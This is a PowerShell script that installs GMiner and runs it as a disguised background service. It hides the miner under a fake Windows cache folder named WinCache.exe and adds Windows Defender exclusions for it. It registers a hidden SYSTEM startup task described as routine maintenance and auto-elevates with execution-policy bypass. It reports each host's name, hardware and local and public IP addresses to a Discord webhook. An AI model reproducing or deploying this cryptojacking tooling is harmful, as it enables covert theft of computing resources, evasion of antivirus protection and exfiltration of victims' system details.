#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys and runs GMiner from a hidden system folder using Task Scheduler.
.EXAMPLE
    .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -TestWebhook -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -Diagnose
.EXAMPLE
    .\Mine.ps1 -Uninstall
#>
[CmdletBinding()]
param(
    [string]$Wallet,
    [string]$Pool,
    [string]$Algo,
    [string]$Worker,
    [string]$DiscordWebhook,
    [switch]$Uninstall,
    [switch]$Foreground,
    [switch]$TestWebhook,
    [switch]$Diagnose,
    [switch]$Run,
    [switch]$NoElevate
)
$ErrorActionPreference = 'Stop'

# ---------- configuration & paths -------------------------------------------
$RemoteScriptUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1'

$Root     = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
$LogDir   = Join-Path $Root 'logs'
$ExePath  = Join-Path $Root 'WinCache.exe'
$SelfPs   = Join-Path $Root 'WinCache.ps1'
$LogFile  = Join-Path $LogDir 'miner.log'
$TaskName = 'WinCacheAgent'

$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

# ---------- helpers ---------------------------------------------------------
function Send-DiscordWebhook {
    param(
        [string]$WebhookUrl,
        [string]$Title,
        [string]$Message,
        [int]$Color = 3066993
    )
    if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
    $payload = [ordered]@{
        embeds = @(
            [ordered]@{
                title       = $Title
                description = $Message
                color       = $Color
                timestamp   = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            }
        )
    } | ConvertTo-Json -Depth 4 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes `
            -ContentType 'application/json; charset=utf-8' `
            -TimeoutSec 15 -ErrorAction Stop | Out-Null
        return $true
    } catch {
        $errMsg = $_.Exception.Message
        if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
            $errMsg += " | Discord: $($_.ErrorDetails.Message)"
        }
        Write-Warning "Webhook failed: $errMsg"
        return $false
    }
}

# NEW: obtiene IP local + IP publica (con cache en memoria para no golpear la API)
$script:NetworkInfoCache = $null
function Get-NetworkInfo {
    if ($script:NetworkInfoCache) { return $script:NetworkInfoCache }
    try {
        $localIPs = @()
        try {
            $localIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object {
                    $_.IPAddress -notlike '127.*' -and
                    $_.IPAddress -notlike '169.254.*' -and
                    $_.IPAddress -ne '0.0.0.0'
                } |
                Select-Object -ExpandProperty IPAddress -Unique)
        } catch {}

        $publicIP = $null
        try {
            $publicIP = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip
        } catch {
            try {
                $publicIP = (Invoke-RestMethod -Uri 'https://ifconfig.me/ip' -TimeoutSec 5 -ErrorAction Stop).ToString().Trim()
            } catch {}
        }

        $localStr = if ($localIPs.Count -gt 0) { ($localIPs -join ', ') } else { 'Desconocida' }
        $pubStr   = if ($publicIP) { $publicIP } else { 'No disponible' }

        $result = "Local: $localStr | Publica: $pubStr"
        $script:NetworkInfoCache = $result
        return $result
    } catch {
        return 'No disponible'
    }
}

# MOD: ahora tambien incluye la IP (local + publica)
function Get-MiningHardware {
    try {
        $os  = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).Name
        $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
        $gpus = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
        
        if ($cpu) { $cpu = $cpu.Trim() }
        if (-not $os) { $os = "Desconocido" }
        if (-not $cpu) { $cpu = "Desconocido" }
        if ($gpus) { $gpuStr = $gpus -join ', ' } else { $gpuStr = "Ninguna detectada" }

        $ipInfo = Get-NetworkInfo

        return "**OS:** $os`n**CPU:** $cpu`n**RAM:** $ram GB`n**GPU(s):** $gpuStr`n**IP:** $ipInfo"
    } catch {
        return "Error al leer hardware: $_"
    }
}

function Check-ScriptUpdate {
    param([string]$LocalPath, [string]$RemoteUrl)
    try {
        # Descargar el script remoto
        $remoteContent = Invoke-RestMethod -Uri $RemoteUrl -TimeoutSec 10 -ErrorAction Stop
        
        if (-not (Test-Path $LocalPath)) {
            return "⚠️ Archivo local no existe. Update necesario."
        }
        
        $localContent = Get-Content -Path $LocalPath -Raw -ErrorAction Stop

        # Normalizar saltos de línea para comparar de forma justa (CRLF vs LF)
        $normRemote = $remoteContent -replace "`r`n", "`n" -replace "`r", "`n"
        $normLocal  = $localContent  -replace "`r`n", "`n" -replace "`r", "`n"

        # Calcular hashes SHA256
        $sha = [System.Security.Cryptography.SHA256]::Create()
        try {
            $remoteHash = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normRemote)))
            $localHash  = [System.BitConverter]::ToString($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($normLocal)))
        } finally {
            $sha.Dispose()
        }

        if ($remoteHash -eq $localHash) {
            return "✅ Al día (Idéntico a GitHub)"
        } else {
            return "⚠️ **Update disponible**: El script en GitHub es más reciente."
        }
    } catch {
        return "❓ No se pudo comprobar update (Error de red o URL)"
    }
}

# ---------- test webhook ----------------------------------------------------
if ($TestWebhook) {
    if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
    Write-Host '[*] Enviando embed de prueba...'
    # MOD: ahora incluye hardware + IP
    $hwInfo = Get-MiningHardware
    $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook `
        -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)`n`n**Hardware:**`n$hwInfo" -Color 3447003
    if ($ok) { Write-Host '[+] Entregado. Revisa el canal.' }
    else     { Write-Host '[-] Falló. Lee el warning de arriba.' }
    return
}

# ---------- diagnose --------------------------------------------------------
if ($Diagnose) {
    function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
    function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }

    Section 'Install path'
    Line 'Root'        $Root
    Line 'Exists'      (Test-Path $Root)
    Line 'WinCache.exe'(Test-Path $ExePath)
    Line 'WinCache.ps1'(Test-Path $SelfPs)
    Line 'miner.log'   $LogFile

    Section 'Scheduled Task'
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) {
        Line 'Task Name' $task.TaskName
        Line 'State'     $task.State
    } else {
        Write-Host '  No hay tarea programada activa.' -ForegroundColor Yellow
    }

    Section 'Hardware'
    $hw = Get-MiningHardware -replace '\*\*',''
    $hw -split "`n" | ForEach-Object { Write-Host "  $_" }

    Section 'Script Update'
    $updateStatus = Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl
    Write-Host "  $updateStatus" -ForegroundColor Yellow

    Section 'Defender exclusions'
    try {
        $mp = Get-MpPreference
        $paths  = @($mp.ExclusionPath)
        $procs  = @($mp.ExclusionProcess)
        Line 'ExclusionPath match'    ($paths -contains $Root)
        Line 'ExclusionProcess match' ($procs -contains 'WinCache.exe')
    } catch {
        Write-Host "  No se pudo consultar Defender: $_" -ForegroundColor Yellow
    }

    Section 'Processes'
    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
    if ($watchers) {
        foreach ($w in $watchers) { Line "Watcher PID $($w.ProcessId)" "PowerShell -Run" }
    } else {
        Write-Host '  Ningún watcher corriendo.' -ForegroundColor Yellow
    }
    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
    if ($miners) {
        foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" }
    } else {
        Write-Host '  Miner NO está corriendo.' -ForegroundColor Yellow
    }

    Section 'Last 15 lines of miner.log'
    if (Test-Path $LogFile) {
        Get-Content $LogFile -Tail 15 | ForEach-Object { Write-Host "  $_" }
    } else {
        Write-Host '  (miner.log no existe)' -ForegroundColor Yellow
    }

    Write-Host ''
    return
}

# ---------- elevation -------------------------------------------------------
if (-not $Run -and -not $NoElevate) {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $a = @('-NoProfile','-ExecutionPolicy','Bypass','-File', "`"$scriptPath`"")
        foreach ($k in $PSBoundParameters.Keys) {
            if ($k -eq 'NoElevate') { continue }
            $v = $PSBoundParameters[$k]
            if ($v -is [switch]) {
                if ($v) { $a += "-$k" }
            } else {
                if ("$v" -match '\s') { $a += @("-$k", "`"$v`"") }
                else                  { $a += @("-$k", "$v")       }
            }
        }
        $a += '-NoElevate'
        Start-Process powershell -Verb RunAs -ArgumentList $a
        exit
    }
}

# ---------- uninstall -------------------------------------------------------
if ($Uninstall) {
    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    $startup = [Environment]::GetFolderPath('Startup')
    Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    
    try {
        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host '[+] Miner stopped, scheduled task removed, exclusions cleared.'
    Write-Host "[*] Files remain at: $Root"
    return
}

# ---------- watcher mode ----------------------------------------------------
if ($Run) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
    
    if (-not $Wallet -or -not $Pool -or -not $Algo) {
        Add-Content (Join-Path $LogDir 'error.log') "[$(Get-Date -f s)] CRITICAL: Faltan argumentos Wallet/Pool/Algo en -Run"
        exit 1
    }

    function Write-Session {
        param([string]$Msg, [string]$Level = 'INFO')
        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Add-Content -Path $LogFile -Value "$ts [$Level] $Msg" -Encoding UTF8
    }

    $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
    $warnRe  = 'connection (refused|reset|closed|timed? ?out)|cannot connect|cuda error'
    
    $argStr = "--algo $Algo --server $Pool --user $Wallet.$Worker"

    Write-Session "===== watcher started (pid $PID) ====="
    Write-Session "exe=$ExePath  pool=$Pool  algo=$Algo  worker=$Worker"

    $restarts = 0
    $maxRestarts = 10
    $restartDelay = 30
    $notifiedStart = $false

    while ($true) {
        Write-Session "launching miner (attempt $($restarts + 1))"
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $ExePath
        $psi.Arguments              = $argStr
        $psi.WorkingDirectory       = $Root
        $psi.UseShellExecute        = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $psi.CreateNoWindow         = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo = $psi
        
        try {
            $proc.Start() | Out-Null
            
            if (-not $notifiedStart -and $DiscordWebhook) {
                $hwInfo = Get-MiningHardware
                $updateStatus = Check-ScriptUpdate -LocalPath $SelfPs -RemoteUrl $RemoteScriptUrl
                
                # MOD: ahora incluye Wallet (hardware+IP van dentro de $hwInfo)
                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nWallet: $Wallet`nPool: $Pool`nAlgo: $Algo`n`n**Hardware:**`n$hwInfo`n`n**Estado del Script:** $updateStatus"
                
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Miner Iniciado y Detectado" -Message $msg -Color 3066993 | Out-Null
                $notifiedStart = $true
            }
        } catch {
            Write-Session "failed to start miner: $_" 'FATAL'
            if ($DiscordWebhook) { Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "❌ Miner Failed to Start" -Message "Error: $_" -Color 15158332 | Out-Null }
            break
        }

        $q = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $subOut = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q
        $subErr = Register-ObjectEvent -InputObject $proc -EventName ErrorDataReceived -Action {
            if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) }
        } -MessageData $q

        $proc.BeginOutputReadLine()
        $proc.BeginErrorReadLine()
        $writer = [System.IO.StreamWriter]::new($LogFile, $true, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        while (-not $proc.HasExited -or -not $q.IsEmpty) {
            $line = $null
            if ($q.TryDequeue([ref]$line)) {
                $ts  = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
                $lvl = 'INFO'
                if ($line -match $fatalRe)    { $lvl = 'FATAL' }
                elseif ($line -match $warnRe) { $lvl = 'WARN'  }
                $writer.WriteLine("$ts [$lvl] $line")
            } else {
                Start-Sleep -Milliseconds 200
            }
        }

        $proc.WaitForExit()
        $exit = $proc.ExitCode
        $writer.Close()
        Unregister-Event -SourceIdentifier $subOut.Name -ErrorAction SilentlyContinue
        Unregister-Event -SourceIdentifier $subErr.Name -ErrorAction SilentlyContinue
        $proc.Dispose()

        Write-Session "miner exited (code $exit)" 'WARN'
        $restarts++
        if ($restarts -ge $maxRestarts) {
            Write-Session "max restarts ($maxRestarts) reached, stopping" 'FATAL'
            if ($DiscordWebhook) { Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "⚠️ Miner Stopped" -Message "Max restarts ($maxRestarts) reached." -Color 15158332 | Out-Null }
            break
        }
        Write-Session "restarting in ${restartDelay}s"
        Start-Sleep -Seconds $restartDelay
    }
    exit 0
}

# ---------- folders ---------------------------------------------------------
foreach ($d in @($Root, $LogDir)) {
    if (-not (Test-Path $d)) {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
        Write-Host "[+] Created $d"
    }
}
try {
    $item = Get-Item $Root -Force
    if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) {
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
    }
} catch {}

# ---------- Defender exclusions ---------------------------------------------
try {
    $mp = Get-MpPreference -ErrorAction Stop
    if (@($mp.ExclusionPath) -notcontains $Root) {
        Add-MpPreference -ExclusionPath $Root -ErrorAction Stop
        Write-Host "[+] Defender exclusion (path): $Root"
    }
    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') {
        Add-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction Stop
        Write-Host "[+] Defender exclusion (process): WinCache.exe"
    }
} catch {
    Write-Warning "Defender exclusions could not be set: $_"
}

# ---------- GMiner fetch ----------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host '[*] Fetching GMiner (windows64, latest release)...'
    $api = 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest'
    $rel = Invoke-RestMethod -Uri $api -Headers @{ 'User-Agent' = 'PowerShell' }
    $asset = $rel.assets | Where-Object { $_.name -match 'windows64\.zip$' } | Select-Object -First 1
    if (-not $asset) { throw 'windows64 asset missing from latest release.' }
    $tmp   = Join-Path $env:TEMP ('gc-{0}.zip' -f ([guid]::NewGuid().ToString('N')))
    $stage = Join-Path $env:TEMP ('gc-{0}'     -f ([guid]::NewGuid().ToString('N')))
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    Expand-Archive -Path $tmp -DestinationPath $stage -Force
    $inner = Get-ChildItem $stage -Recurse -Filter 'miner.exe' | Select-Object -First 1
    if (-not $inner) { throw 'miner.exe not found in archive.' }
    Copy-Item $inner.FullName $ExePath -Force
    Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Installed $ExePath"
} else {
    Write-Host '[=] WinCache.exe present'
}

# ---------- worker hash -----------------------------------------------------
if ([string]::IsNullOrWhiteSpace($Worker)) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
        $hash  = $sha.ComputeHash($bytes)
    } finally {
        $sha.Dispose()
    }
    $shortHash = [System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower()
    $Worker = "rig_$shortHash"
}

# ---------- install self (con validación) -----------------------------------
if ($scriptPath -ne $SelfPs) {
    Copy-Item $scriptPath $SelfPs -Force
    Unblock-File $SelfPs -ErrorAction SilentlyContinue

    $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
    if ($head -notmatch '^#Requires' -and $head -notmatch '^<#' -and $head -notmatch '^\[CmdletBinding') {
        Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
        throw "WinCache.ps1 copiado no parece PowerShell válido (primera línea: '$head'). Abortando para no romper el auto-arranque."
    }
    Write-Host "[+] Installed $SelfPs"
}

# ---------- scheduled task --------------------------------------------------
Write-Host '[*] Registrando tarea programada con parámetros inyectados...'
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
$argList += " -Run -NoElevate"

$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "Mantenimiento en segundo plano de WinCache" | Out-Null
Write-Host "[+] Auto-start instalado como Tarea Programada: $TaskName"

# ---------- launch watcher (ahora mismo) ------------------------------------
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*WinCache.ps1*' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

$p = $null
if ($Foreground) {
    & $SelfPs -Run -NoElevate -Wallet $Wallet -Pool $Pool -Algo $Algo -Worker $Worker -DiscordWebhook $DiscordWebhook
} else {
    $p = Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Hidden -PassThru
    Write-Host "[+] Watcher running (pid $($p.Id))"
}

# ---------- notify and summary ----------------------------------------------
if ($DiscordWebhook) {
    $pidInfo = if ($p) { "Watcher PID: $($p.Id)" } else { "Mode: Foreground" }
    # MOD: ahora incluye Wallet + hardware + IP
    $hwInfo = Get-MiningHardware
    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nWallet: $Wallet`nPool: $Pool`nAlgo: $Algo`n$pidInfo`n`n**Hardware:**`n$hwInfo"
    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Completada" -Message $msg -Color 3066993 | Out-Null
}

Write-Host ''
Write-Host '=================================================='
Write-Host '  Mining in background. Auto-start enabled via Task Scheduler.'
Write-Host "  Install : $Root"
Write-Host "  Log     : $LogFile"
Write-Host ''
Write-Host '  Follow log:'
Write-Host "    Get-Content `"$LogFile`" -Wait -Tail 20"
Write-Host ''
Write-Host '  Diagnose:'
Write-Host '    .\Mine.ps1 -Diagnose'
Write-Host ''
Write-Host '  Stop everything:'
Write-Host '    .\Mine.ps1 -Uninstall'
Write-Host '=================================================='
